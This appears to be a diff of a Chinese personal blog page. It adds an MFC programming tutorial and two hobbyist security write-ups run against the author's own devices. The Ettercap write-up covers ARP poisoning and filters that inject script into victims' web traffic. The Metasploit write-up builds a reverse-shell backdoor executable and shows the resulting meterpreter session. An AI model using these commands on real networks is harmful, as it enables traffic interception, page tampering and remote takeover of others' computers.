+<p>在CCarsDoc的成员函数OnNewDocument()中初始化数据:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BOOL CCarsDoc::OnNewDocument()&#123;	<span class="keyword">if</span> (!CDocument::OnNewDocument())		<span class="keyword">return</span> FALSE;     m_rectCar=CRect(<span class="number">100</span>,<span class="number">100</span>,<span class="number">180</span>,<span class="number">150</span>);	 <span class="keyword">int</span> speed = <span class="number">1</span>;	 m_boolNew=<span class="literal">true</span>;	 m_Length=<span class="number">0</span>;	 m_Width=<span class="number">0</span>;	<span class="comment">// <span class="doctag">TODO:</span> add reinitialization code here</span>	<span class="comment">// (SDI documents will reuse this document)</span>    <span class="keyword">return</span> TRUE;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>再通过资源编辑器中的菜单编辑器完成菜单的编辑，使用ClassWizard生成消息处理函数，并自动添加菜单消息和消息处理函数的映射，在消息处理函数中加入代码:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CCarsView::Onstart() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CCarsDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);	CRect rectClient;	GetClientRect(&amp;rectClient);	SetTimer(<span class="number">1</span>,<span class="number">100</span>,<span class="literal">NULL</span>);		&#125;<span class="keyword">void</span> CCarsView::OnTimer(UINT nIDEvent) &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default</span></span><br><span class="line">	CCarsDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);	InvalidateRect(pDoc-&gt;m_rectCar,TRUE);	<span class="keyword">static</span> <span class="keyword">int</span> flag = <span class="number">1</span>;	<span class="keyword">if</span>(pDoc-&gt;m_rectCar.right &gt; pDoc-&gt;m_Length || pDoc-&gt;m_rectCar.left &lt; <span class="number">50</span>)	&#123;		flag *= -<span class="number">1</span>;	&#125;	    pDoc-&gt;m_rectCar.left += pDoc-&gt;speed*flag;	pDoc-&gt;m_rectCar.right += pDoc-&gt;speed*flag;		InvalidateRect(pDoc-&gt;m_rectCar,FALSE);	CView::OnTimer(nIDEvent);	&#125;<span class="keyword">void</span> CCarsView::Onstop() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	KillTimer(<span class="number">1</span>);&#125;<span class="keyword">void</span> CCarsView::Onhigh() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>    CCarsDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);	pDoc-&gt;speed=<span class="number">10</span>;&#125;<span class="keyword">void</span> CCarsView::Onmedium() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CCarsDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);    pDoc-&gt;speed=<span class="number">5</span>;&#125;<span class="keyword">void</span> CCarsView::Onlow() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>    CCarsDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);	pDoc-&gt;speed=<span class="number">1</span>;&#125;<span class="keyword">void</span> CCarsView::OnMenuitem32777() &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>	CCarsDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);	CCarsDlg dlginput;	<span class="keyword">int</span> nRet = dlginput.DoModal();	<span class="keyword">if</span>(nRet = IDOK)	&#123;		pDoc-&gt;m_Length=dlginput.m_Length;		pDoc-&gt;m_Width=dlginput.m_Width;		pDoc-&gt;m_boolNew=<span class="literal">false</span>;		Invalidate();	&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后在OnDraw()里绘制小车和跑道:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CCarsView::OnDraw(CDC* pDC)&#123;	CCarsDoc* pDoc = GetDocument();	ASSERT_VALID(pDoc);	pDC-&gt;Rectangle(pDoc-&gt;m_rectCar);	pDC-&gt;MoveTo(<span class="number">50</span>,<span class="number">50</span>);	pDC-&gt;LineTo(pDoc-&gt;m_Length,<span class="number">50</span>);	pDC-&gt;MoveTo(<span class="number">50</span>,<span class="number">50</span>+(pDoc-&gt;m_Width));	pDC-&gt;LineTo(pDoc-&gt;m_Length,<span class="number">50</span>+(pDoc-&gt;m_Width));		<span class="comment">// <span class="doctag">TODO:</span> add draw code for native data here</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>设计一个具有一定外形和颜色的计数器。开始结束由鼠标控制。   </li>
+<li>实现:</li>
+</ul>
+<p>修改文档类的定义，添加成员变量:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> CCountDoc : <span class="keyword">public</span> CDocument&#123;<span class="keyword">protected</span>: <span class="comment">// create from serialization only</span>	CCountDoc();	DECLARE_DYNCREATE(CCountDoc)<span class="comment">// Attributes</span><span class="keyword">public</span>:	<span class="keyword">int</span> m_iCount;<span class="comment">// Operations</span><span class="keyword">public</span>:<span class="comment">// Overrides..... 省略以下</span></span><br></pre></td></tr></table></figure></p>
+<p>在成员函数OnNewDocument()中初始化数据:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m_iCount = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p>
+<p>使用ClassWizaid生成消息处理函数,鼠标左键开始计数，右键停止计数:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CCountView::OnLButtonDown(UINT nFlags, CPoint point) &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default</span>	SetTimer(<span class="number">1</span>,<span class="number">100</span>,<span class="literal">NULL</span>);	CView::OnLButtonDown(nFlags, point);&#125;<span class="keyword">void</span> CCountView::OnRButtonDown(UINT nFlags, CPoint point) &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default</span>	KillTimer(<span class="number">1</span>);	CView::OnRButtonDown(nFlags, point);&#125;<span class="keyword">void</span> CCountView::OnTimer(UINT nIDEvent) &#123;	<span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default</span>    CCountDoc *pDoc=GetDocument();	ASSERT_VALID(pDoc);	pDoc-&gt;m_iCount++;	Invalidate();	CView::OnTimer(nIDEvent);&#125;</span><br></pre></td></tr></table></figure></p>
+<p>对了，绘图的时候要有颜色:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> CCountView::OnDraw(CDC* pDC)&#123;	CCountDoc* pDoc = GetDocument();	ASSERT_VALID(pDoc);	CString strDisplay;	CPen penBlue;	penBlue.CreatePen(PS_SOLID,<span class="number">3</span>,RGB(<span class="number">0</span>,<span class="number">0</span>,<span class="number">255</span>));	strDisplay.Format (<span class="string">"Current number:%d"</span>,pDoc-&gt;m_iCount);	pDC-&gt;SetTextColor(RGB(<span class="number">0</span>,<span class="number">255</span>,<span class="number">0</span>));	pDC-&gt;SelectObject(&amp;penBlue);	pDC-&gt;Rectangle(<span class="number">50</span>,<span class="number">50</span>,<span class="number">280</span>,<span class="number">180</span>);	pDC-&gt;TextOut(<span class="number">100</span>,<span class="number">100</span>,strDisplay);	<span class="comment">// <span class="doctag">TODO:</span> add draw code for native data here</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="u5C0F_u7ED3"><a href="#u5C0F_u7ED3" class="headerlink" title="小结"></a>小结</h3><p>我要检讨一下自己当时小学期的时候没有好好学习MFC，很多东西都不记得了。在编写这两个程序的过程中还遇到了很多问题，比如让小车往返运动的问题，请教了<a href="http://lyeec.me" target="_blank" rel="external">@Lyeec</a>。还有，我一定要养成随手写注释的习惯。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C++</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MFC/">MFC</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/编程学习/">编程学习</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-2015-11-12-ARP" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/11/12/2015-11-12-ARP/" class="article-date">
+  	<time datetime="2015-11-12T03:40:25.000Z" itemprop="datePublished">2015-11-12</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/11/12/2015-11-12-ARP/">Ettercap使用小结</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Ettercap_u7B80_u4ECB_uFF1A"><a href="#Ettercap_u7B80_u4ECB_uFF1A" class="headerlink" title="Ettercap简介："></a>Ettercap简介：</h1><p>ettercap是一个进行中间人攻击的全面工具套装，它可以嗅探数据和玩一些其他有意思的把戏…… 我从官网介绍上随意翻译的=_=</p>
+<h1 id="u4E00_u6B21_u4E2D_u95F4_u4EBA_u653B_u51FB_u5B9E_u4F8B"><a href="#u4E00_u6B21_u4E2D_u95F4_u4EBA_u653B_u51FB_u5B9E_u4F8B" class="headerlink" title="一次中间人攻击实例"></a>一次中间人攻击实例</h1><ul>
+<li>工具： Ettercap Wireshark </li>
+<li>攻击者：Mac OS X 10.10.5</li>
+<li>目标：iPhone （iOS 9.1）<h2 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h2>打开内核ip转发功能，否则会导致被攻击的对象无法上网。在终端里输入<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl net.inet.ip.forwarding=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>终端提示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.inet.ip.forwarding: <span class="number">0</span> -&gt; <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>这样就可以开始进行ARP毒化和中间人攻击了。(注意：这是Mac OS X系统的命令，Linux系统请自行Google)</p>
+<h2 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h2><h3 id="u55C5_u63A2"><a href="#u55C5_u63A2" class="headerlink" title="嗅探"></a>嗅探</h3><p>ettercap提供了四种用户界面<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Text Only – ‘-T’ option</span><br><span class="line">Curses – ‘-C’ option</span><br><span class="line">GTK – ‘-G’ option</span><br><span class="line">Daemon – ‘-D’ option</span><br></pre></td></tr></table></figure></p>
+<p>我使用的是命令行模式，感觉它UI做的好丑。<br>下面是ARP毒化的指令<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ettercap -T -q -i en0 -M ARP:remote /<span class="number">192.168</span><span class="number">.1</span><span class="number">.4</span>/ /<span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>/</span><br></pre></td></tr></table></figure></p>
+<p>T参数是Text Only，q参数是安静模式，M参数表示MITM即中间人攻击。192.168.1.4是iPhone的ip地址，192.168.1.1是路由的ip地址。<br>  使用该命令后，攻击开始，按q键结束。同时打开Wireshark即可看到目标访问的所有http链接的明文内容。如下图所示：<img src="http://ww1.sinaimg.cn/mw690/005WMcFzgw1exyg0unp7oj311t0np479.jpg" alt=""></p>
+<h3 id="u4F7F_u7528_u63D2_u4EF6"><a href="#u4F7F_u7528_u63D2_u4EF6" class="headerlink" title="使用插件"></a>使用插件</h3><p>在ettercap可以使用自己编写的插件来实现一些功能，当然ettercap也提供了一些插件。在/usr/local/bin/目录下用vim新建.filter文件。<br>我们先尝试注入代码让目标浏览网页时弹窗，代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ip.proto == TCP &amp;&amp; tcp.dst == <span class="number">80</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (search(DATA.data, <span class="string">"Accept-Encoding"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        replace(<span class="string">"Accept-Encoding"</span>, <span class="string">"Accept-Rubbish!"</span>);</span><br><span class="line">        <span class="preprocessor"># note: replacement string is same length as original string</span></span><br><span class="line">        msg(<span class="string">"zapped Accept-Encoding!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ip.proto == TCP &amp;&amp; tcp.src == <span class="number">80</span>)</span><br><span class="line">&#123;</span><br><span class="line">    replace(<span class="string">"&lt;head&gt;"</span>, <span class="string">"&lt;head&gt;&lt;script type="</span>text/javascript<span class="string">"&gt;alert('test');&lt;/script&gt;"</span>);</span><br><span class="line">    replace(<span class="string">"&lt;HEAD&gt;"</span>, <span class="string">"&lt;HEAD&gt;&lt;script type="</span>text/javascript<span class="string">"&gt;alert('test');&lt;/script&gt;"</span>);</span><br><span class="line">    msg(<span class="string">"Injecting OK!!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>接着在终端中输入：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">etterfilter window.filter -o windowtest3.ef</span><br></pre></td></tr></table></figure></p>
+<p>简单解释下，可以输入etterfilter -h来获得帮助，o参数是输出文件名。<br>效果如下图所示：<br><img src="http://ww1.sinaimg.cn/mw690/005WMcFzgw1exyg212emhj30hs0vkah0.jpg" alt=""><br>再尝试下替换网页的图片试试，还是和上面一样直接上源码；<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ip.proto == TCP &amp;&amp; tcp.dst == <span class="number">80</span>) &#123;</span><br><span class="line">   <span class="keyword">if</span> (search(DATA.data, <span class="string">"Accept-Encoding"</span>)) &#123;</span><br><span class="line">      replace(<span class="string">"Accept-Encoding"</span>, <span class="string">"Accept-Rubbish!"</span>);</span><br><span class="line">      msg(<span class="string">"zapped Accept-Encoding!\n"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ip.proto == TCP &amp;&amp; tcp.src == <span class="number">80</span>) &#123;</span><br><span class="line">   replace(<span class="string">"img src="</span>, <span class="string">"img src=\"http://img5.duitang.com/uploads/item/201507/22/20150722212458_YrGtd.jpeg\" "</span>);</span><br><span class="line">   replace(<span class="string">"IMG SRC="</span>, <span class="string">"img src=\"http://img5.duitang.com/uploads/item/201507/22/20150722212458_YrGtd.jpeg\" "</span>);</span><br><span class="line">   msg(<span class="string">"Filter Ran.\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我找了个小埋的图片233，看看效果；<br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzgw1exyg1u3hdsj30hs0vktdi.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/mw690/005WMcFzgw1exyg1or9cbj30hs0vk13q.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/mw690/005WMcFzgw1exyg10kyknj30hs0vkdv6.jpg" alt=""><br>还可以通过插件来替换对方的下载内容，配合Metasploit生成后门甚至可以完全控制目标计算机。我还没测试过是否能用……</p>
+<h1 id="u5C0F_u7ED3"><a href="#u5C0F_u7ED3" class="headerlink" title="小结"></a>小结</h1><p>中间人攻击和中间人毒化利用了ARP(地址解析协议)的固有漏洞，操作简单但是危害极大，原来我一直是主张计算机裸奔党，从来不用杀软。然而对于小白来说，喜欢乱点的同学们，你们真的需要杀毒软件来保护你们的电脑不被入侵。杀毒软件弹个窗请看清楚再关……<br>对了，突然想起来https协议就算是用ettercap＋Wireshark也是看不到传输内容的，但是通过sslstrip就可以突破ssl获取密码了，以后有时间再进行测试吧，今天就写到这里。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Wi-Fi/">Wi-Fi</a></li></ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/渗透入侵/">渗透入侵</a>
+	</div>
+
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-2015-11-08-msf" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/11/08/2015-11-08-msf/" class="article-date">
+  	<time datetime="2015-11-08T03:40:25.000Z" itemprop="datePublished">2015-11-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/11/08/2015-11-08-msf/">Metasploit折腾小记</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li>还是写在文前：怎么说呢，折腾这个东西我的内心是很复杂的。一个美好的用来写模电和概率和大物的周日就这么没了ˊ_&gt;ˋ哎呀，可是人家就是这么执着的跳坑怎么破。还是和以往一样，这篇文章的相关技术仅供学习，千万不要做出一些危险出格的事情。</li>
+</ul>
+<h3 id="Metasploit_u7684_u5B89_u88C5"><a href="#Metasploit_u7684_u5B89_u88C5" class="headerlink" title="Metasploit的安装"></a>Metasploit的安装</h3><p>这一部分真的是让我的心都碎了，也是最难折腾的。在YouTube上面找了好多视频，永远都是人家一路回车，我一路报错，果然是人品用完的节奏。闲话少说，开始安装，我的系统是Mac OS X 10.10.5，一般大家都是用BT5干这种活啦。</p>
+<ol>
+<li>从Github上克隆Metasploit项目<br>选一个合适的目录，然后在终端里面输入:  </li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:rapid7/metasploit-framework.git</span><br></pre></td></tr></table></figure>
+<p>之后把终端cd到你刚才选择的目录，输入:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></p>
+<p>报错就对了，因为你没有装蛋疼的依赖环境。</p>
+<ol>
+<li>安装依赖环境<br>2.1 <em>Ruby</em><br>因为我是Mac系统又安装了Xcode，所以已经有了Ruby 1.8的环境，但是后续安装会要求更高的版本，所以我们先更新一下Ruby，推荐使用rvm，具体参见<a href="http://www.inferjay.com/blog/2013/05/09/how-to-install-ruby-1-dot-9-3-in-mac-osx/" target="_blank" rel="external">脉脉不得语的技术博客</a><br>2.2 <em>Homebrew</em><br>这玩意是个OS X的软件管理器，相当好用，我们使用Ruby命令来安装它，下面的安装会用到。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -e <span class="string">"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>我们作死运行下Metasploit，发现还是报错，具体报什么错我也忘记了（哭）。<br>2.3 <em>Nmap</em><br>强大的嗅探器，使用我们刚刚装好的homebrew安装：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">brew install nmap</span><br><span class="line">```    </span><br><span class="line"><span class="number">2.4</span> *bundler*  </span><br><span class="line">就是这货坑死人不偿命，按照教程来说，只需要简单的一句指令：</span><br><span class="line">```c</span><br><span class="line">gem install bundler</span><br></pre></td></tr></table></figure></p>
+<p>我猜你们一定会在安装到nokogiri的时候报错，事实就是这玩意需要自己手动安装，报错提示libiconv is missing，解决方案：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brew update</span><br><span class="line">xcode-select --install</span><br><span class="line">brew link libiconv--force</span><br><span class="line">gem install nokogiri -- --with-iconv-dir=/usr/local/Cellar/libiconv/<span class="number">1.14</span></span><br></pre></td></tr></table></figure></p>
+<p>再次使用gem install bundler</p>
+<ol>
+<li>安装postgresql并配置。<br>这个我不会-_-#，因为我发现不配置数据库的话Metasploit已经可以使用了，不用数据库的视频教程见<a href="https://www.youtube.com/watch?v=C2CEQupM2PM" target="_blank" rel="external">YouTube</a>.我基本上是按照他的顺序安装的。<br>关于配置数据库的教程：<a href="http://www.freebuf.com/articles/system/36924.html" target="_blank" rel="external">RickGrey</a>(中文教程)、<a href="http://www.darkoperator.com/installing-metasploit-framewor/" target="_blank" rel="external">Darkoperator</a>(英文教程)。<br>其他的相关问题可以在官方的论坛<a href="https://community.rapid7.com/community/metasploit" target="_blank" rel="external">RAPID7COMMUNITY</a>上交流。   </li>
+</ol>
+<h3 id="u4E00_u6B21_u7B80_u5355_u7684_u5185_u7F51_u6E17_u900F"><a href="#u4E00_u6B21_u7B80_u5355_u7684_u5185_u7F51_u6E17_u900F" class="headerlink" title="一次简单的内网渗透"></a>一次简单的内网渗透</h3><ul>
+<li>工具：Mac OS X with Metasploit(Attacker)  Windows 7(Victim)</li>
+<li>原理：通过msfpayload生成后门exe然后上传到目标机器上执行，通过本地监听获得meterpreter shell，并得到shell<h4 id="u751F_u6210_u4E00_u4E2Abackdoor-exe"><a href="#u751F_u6210_u4E00_u4E2Abackdoor-exe" class="headerlink" title="生成一个backdoor.exe"></a>生成一个backdoor.exe</h4>Windows:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./msfvenom windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; X &gt; backdoor.exe</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>几点说明：如果被攻击的计算机和你在同一局域网下，可以使用LAN IP，用ifconfig即可，如果是WAN攻击则使用WAN IP即可。<br>如果运行sudo ./msfvenom终端提示你安装bundler，自求多福吧，我也不知道怎么解决的。耗了一下午反复装了无数遍最后居然莫名其妙的好了。<br>这里使用的msfvenom是因为软件更新，原先的msfpayload功能已经集成在了msfvenom里了。</p>
+<h4 id="u4E0A_u4F20backdoor-exe_u5E76_u83B7_u5F97shell"><a href="#u4E0A_u4F20backdoor-exe_u5E76_u83B7_u5F97shell" class="headerlink" title="上传backdoor.exe并获得shell"></a>上传backdoor.exe并获得shell</h4><p>直接上指令：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ msfconsole</span><br><span class="line">msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set LHOST 192.168.1.3</span><br><span class="line">LHOST =&gt; 192.168.1.3</span><br><span class="line">msf exploit(handler) &gt; set LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br></pre></td></tr></table></figure></p>
+<p>在Victim的计算机上双击backdoor.exe，顺利的话会这样：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse handler on 192.168.1.3:4444</span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[*] Sending stage (957486 bytes) to 192.168.1.3</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.3:4444 -&gt; 192.168.1.3:54411) at 2015-11-08 22:07:07 +0800</span><br></pre></td></tr></table></figure></p>
+<p>然后输入shell尽情玩耍吧……<br>附上一张截图：<br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzjw1exupqph2nvj313w0bxack.jpg" alt=""><br>由图可见我完全接管了Windows 7的shell，下面就可以随心所欲了23333</p>
+<h3 id="u5C0F_u7ED3"><a href="#u5C0F_u7ED3" class="headerlink" title="小结"></a>小结</h3><p>对于linux来说，遇到错误真的就是Google，复制命令然后祈祷了。装什么东西都要搞一大堆依赖包，不过总体来说还是比较人性化，大多数时候终端会告诉你你需要装什么。Metasploit功能强大，最近在测试的只是基于LAN下的计算机，更深入的问题留作以后探讨。<br>最后用BackTrack Linux上的一句话来作结：</p>
 <blockquote>
-<p>这句话是我说的。   </p>
+<p>The quieter you become,the more you are able to hear…</p>
 </blockquote>
-<p><em>好像还不错的样子( ´ ▽ ` )ﾉ 斜体喔</em></p>
-<ul>
-<li><p>简明的教程<a href="http://www.jianshu.com/p/q81RER" target="_blank" rel="external">简书</a>写的很不错。  </p>
-</li>
-<li><p>语法大全参见<a href="http://wowubuntu.com/markdown/" target="_blank" rel="external">wowubuntu</a>。  </p>
-</li>
-<li><p>最后强行推荐一个Mac软件<a href="http://mouapp.com" target="_blank" rel="external">Mou</a>，不错的Markdown编辑器。（界面截图）<br><img src="http://ww1.sinaimg.cn/mw690/005WMcFzjw1ex12b8u4cej30p00h0gos.jpg" alt=""></p>
-</li>
-</ul>
 
       
     </div>
@@ -603,12 +883,12 @@
       
       
 	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Blog/">Blog</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Metasploit/">Metasploit</a></li></ul>
 	</div>
 
       
 	<div class="article-category tagcloud">
-	<a class="article-category-link" href="/categories/前端开发/">前端开发</a>
+	<a class="article-category-link" href="/categories/渗透入侵/">渗透入侵</a>
 	</div>
 
 
@@ -629,11 +909,11 @@
 
 
   
-    <article id="post-2015-10-09-cppcode2" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-2015-10-23-cppcode4" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2015/10/09/2015-10-09-cppcode2/" class="article-date">
-  	<time datetime="2015-10-09T15:25:11.000Z" itemprop="datePublished">2015-10-09</time>
+      <a href="/2015/10/23/2015-10-23-cppcode4/" class="article-date">
+  	<time datetime="2015-10-23T14:11:48.000Z" itemprop="datePublished">2015-10-23</time>
 </a>
     </div>
   
@@ -646,7 +926,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2015/10/09/2015-10-09-cppcode2/">c++ primer 2.1</a>
+      <a class="article-title" href="/2015/10/23/2015-10-23-cppcode4/">c++ primer 3</a>
     </h1>
   
 
@@ -655,34 +935,45 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>这次准备把非编程题的答案也放上去+_+<br>决定使用English来写题目以示逼格。</p>
-
-<p><li>2.1</li></p>
-<p><li>What are the differences between int, long, long long, and short? Between an unsigned and a signed type? Between a float and a double?</li></p>
-<p><small>c++ primer原文如下：C++ guarantees short and int is at least 16 bits, long at least 32 bits, long long at least 64 bits.<br><br>The signed can represent positive numbers, negative numbers and zero, while unsigned can only represent numbers no less than zero.<br><br>The C and C++ standards do not specify the representation of float, double and long double. It is possible that all three implemented as IEEE double-precision. Nevertheless, for most architectures (gcc, MSVC; x86, x64, ARM) float is indeed a IEEE single-precision floating point number (binary32), and double is a IEEE double-precision floating point number (binary64).</small></p>
-
-<p><li>2.2</li></p>
-<p><li>To calculate a mortgage payment, what types would you use for the rate, principal, and payment? Explain why you selected each type.</li></p>
-<p><small>太水了</small></p>
-
-<p><li>2.3</li></p>
